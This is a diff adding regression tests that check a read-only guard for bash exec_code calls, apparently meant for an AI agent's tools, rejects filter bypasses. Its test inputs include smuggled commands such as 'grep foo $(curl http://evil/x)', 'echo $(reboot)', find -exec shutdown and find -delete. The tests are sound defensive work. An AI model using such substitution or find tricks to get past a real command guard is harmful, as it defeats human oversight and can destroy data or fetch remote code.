@@ -57,4 +57,40 @@ describe("isReadOnlyExec", () => {
     process.env.ENGOPS_READONLY_EXTRA = "^custom-readonly-tool\\b";
     expect(isReadOnlyExec("exec_code", { language: "bash", code: "custom-readonly-tool --check" })).toBe(true);
   });
+
+  describe("command/process substitution bypass (regression)", () => {
+    test("rejects $(...) command substitution even under an allowed command name", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "echo $(reboot)" })).toBe(false);
+    });
+
+    test("rejects backtick command substitution", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "echo `reboot`" })).toBe(false);
+    });
+
+    test("rejects $(...) embedded inside an otherwise-allowed pipe segment", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "grep foo $(curl http://evil/x)" })).toBe(false);
+    });
+
+    test("rejects process substitution", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "cat <(reboot)" })).toBe(false);
+    });
+  });
+
+  describe("find -exec / -delete bypass (regression)", () => {
+    test("allows a plain read-only find", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "find . -name '*.log'" })).toBe(true);
+    });
+
+    test("rejects find -delete", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "find . -name '*.log' -delete" })).toBe(false);
+    });
+
+    test("rejects find -exec running an arbitrary command", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "find / -name x -exec shutdown now \\;" })).toBe(false);
+    });
+
+    test("rejects find -ok (interactive exec is still exec)", () => {
+      expect(isReadOnlyExec("exec_code", { language: "bash", code: "find . -ok rm {} \\;" })).toBe(false);
+    });
+  });
 });
